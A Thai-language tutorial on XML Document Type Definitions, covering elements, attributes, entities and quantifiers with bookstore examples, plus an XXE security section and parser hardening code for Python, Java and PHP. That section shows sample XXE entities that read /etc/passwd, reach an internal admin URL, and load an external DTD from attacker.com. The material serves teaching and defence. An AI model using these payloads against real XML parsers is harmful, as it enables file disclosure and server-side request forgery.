# DTD (Document Type Definition) คืออะไร?

## ความหมายพื้นฐาน

**DTD (Document Type Definition)** คือชุดของกฎและโครงสร้างที่กำหนดว่าเอกสาร XML ควรมีหน้าตาอย่างไร มีองค์ประกอบอะไรบ้าง และมีความสัมพันธ์กันอย่างไร

เปรียบเทียบได้กับ:
- **แบบแปลน** สำหรับสร้างบ้าน
- **สูตรอาหาร** ที่บอกส่วนผสมและขั้นตอน
- **กรอบโครงสร้าง** ที่บอกว่า XML ต้องเขียนยังไง

---

## ประเภทของ DTD

### 1. Internal DTD (DTD ภายใน)
กำหนดไว้ภายในเอกสาร XML เดียวกัน

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
<note>
  <to>John</to>
  <from>Jane</from>
  <heading>Reminder</heading>
  <body>Don't forget our meeting!</body>
</note>
```

### 2. External DTD (DTD ภายนอก)
อ้างอิงจากไฟล์แยกต่างหาก

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
  <to>John</to>
  <from>Jane</from>
  <heading>Reminder</heading>
  <body>Don't forget our meeting!</body>
</note>
```

ไฟล์ `note.dtd`:
```dtd
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

---

## องค์ประกอบหลักของ DTD

### 1. Elements (องค์ประกอบ)
กำหนดแท็กที่สามารถใช้ได้

```dtd
<!ELEMENT ชื่อองค์ประกอบ (เนื้อหา)>
```

**ตัวอย่าง:**
```dtd
<!ELEMENT book (title, author, price)>
<!ELEMENT title (#PCDATA)>
<!ELEMENT author (#PCDATA)>
<!ELEMENT price (#PCDATA)>
```

**ประเภทเนื้อหา:**
- `#PCDATA` - ข้อความธรรมดา
- `EMPTY` - ไม่มีเนื้อหา
- `ANY` - อะไรก็ได้
- `(child1, child2)` - ลำดับของ child elements

### 2. Attributes (คุณสมบัติ)
กำหนด attributes ของ elements

```dtd
<!ATTLIST ชื่อองค์ประกอบ 
  ชื่อ attribute ประเภท ค่าเริ่มต้น>
```

**ตัวอย่าง:**
```dtd
<!ATTLIST book 
  id ID #REQUIRED
  category CDATA #IMPLIED
  language (en|th|jp) "en">
```

**ประเภท Attribute:**
- `CDATA` - ข้อความทั่วไป
- `ID` - ตัวระบุเฉพาะ
- `IDREF` - อ้างอิงไปยัง ID อื่น
- `(value1|value2)` - เลือกจากตัวเลือกที่กำหนด

**ค่าเริ่มต้น:**
- `#REQUIRED` - จำเป็นต้องมี
- `#IMPLIED` - ไม่จำเป็น
- `"ค่าเริ่มต้น"` - ค่าที่กำหนดไว้

### 3. Entities (เอนทิตี)
สร้างตัวแปรหรือ shortcut

```dtd
<!ENTITY ชื่อ "ค่า">
```

**ตัวอย่าง:**
```dtd
<!ENTITY company "Acme Corporation">
<!ENTITY copyright "Copyright 2024 &company;">
```

**การใช้งาน:**
```xml
<footer>&copyright;</footer>
<!-- ผลลัพธ์: <footer>Copyright 2024 Acme Corporation</footer> -->
```

---

## ตัวอย่าง DTD ที่สมบูรณ์

### DTD สำหรับร้านหนังสือ:

```dtd
<!ELEMENT bookstore (book+)>
<!ELEMENT book (title, author+, price, description?)>
<!ELEMENT title (#PCDATA)>
<!ELEMENT author (#PCDATA)>
<!ELEMENT price (#PCDATA)>
<!ELEMENT description (#PCDATA)>

<!ATTLIST book 
  id ID #REQUIRED
  category (fiction|non-fiction|technical) #REQUIRED
  language (en|th) "en">

<!ATTLIST price 
  currency (USD|THB) "USD">

<!ENTITY store "ABC Bookstore">
<!ENTITY contact "Tel: 02-123-4567">
```

### XML ที่ใช้ DTD นี้:

```xml
<?xml version="1.0"?>
<!DOCTYPE bookstore SYSTEM "bookstore.dtd">
<bookstore>
  <book id="b001" category="fiction" language="en">
    <title>The Great Adventure</title>
    <author>John Smith</author>
    <price currency="USD">29.99</price>
    <description>An exciting journey through unknown lands.</description>
  </book>
  
  <book id="b002" category="technical">
    <title>XML Programming</title>
    <author>Jane Doe</author>
    <author>Bob Wilson</author>
    <price currency="THB">890</price>
  </book>
</bookstore>
```

---

## Quantifiers (ตัวกำหนดจำนวน)

```dtd
<!ELEMENT parent (child)>      <!-- ต้องมี child ตัวเดียว -->
<!ELEMENT parent (child?)>     <!-- มี child 0 หรือ 1 ตัว -->
<!ELEMENT parent (child*)>     <!-- มี child 0 หรือมากกว่า -->
<!ELEMENT parent (child+)>     <!-- มี child 1 หรือมากกว่า -->
<!ELEMENT parent (child1, child2)>    <!-- มี child1 แล้วตามด้วย child2 -->
<!ELEMENT parent (child1 | child2)>   <!-- มี child1 หรือ child2 -->
```

---

## External Entities และความเสี่ยง XXE

### External Entity ปกติ:
```dtd
<!ENTITY footer SYSTEM "footer.xml">
```

### External Entity ที่เป็นอันตราย:
```dtd
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY ssrf SYSTEM "http://internal.server.com/admin">
```

### Parameter Entities:
```dtd
<!ENTITY % param "value">
<!ENTITY % external SYSTEM "http://attacker.com/evil.dtd">
%external;
```

---

## การป้องกันปัญหา DTD/XXE

### 1. ปิดใช้งาน External Entities

**Python:**
```python
import xml.etree.ElementTree as ET
import defusedxml.ElementTree as safe_ET

# ไม่ปลอดภัย
root = ET.fromstring(xml_data)

# ปลอดภัย
root = safe_ET.fromstring(xml_data)
```

**Java:**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**PHP:**
```php
libxml_disable_entity_loader(true);
```

### 2. ใช้ XML Schema แทน DTD
```xsd
<?xml version="1.0"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="book">
    <xs:complexType>
      <xs:sequence>
        <xs:element name="title" type="xs:string"/>
        <xs:element name="author" type="xs:string"/>
        <xs:element name="price" type="xs:decimal"/>
      </xs:sequence>
    </xs:complexType>
  </xs:element>
</xs:schema>
```

---

## สรุป

**DTD** เป็นเครื่องมือที่มีประโยชน์สำหรับ:
- กำหนดโครงสร้าง XML
- ตรวจสอบความถูกต้องของข้อมูล
- สร้าง reusable components ด้วย entities

**แต่มีความเสี่ยง:**
- XXE Injection
- Information Disclosure
- SSRF Attacks

**ข้อแนะนำ:**
- ใช้ XML Schema แทน DTD หากเป็นไปได้
- ปิดใช้งาน external entities
- ใช้ secure XML parser libraries
- Validate input อย่างเข้มงวด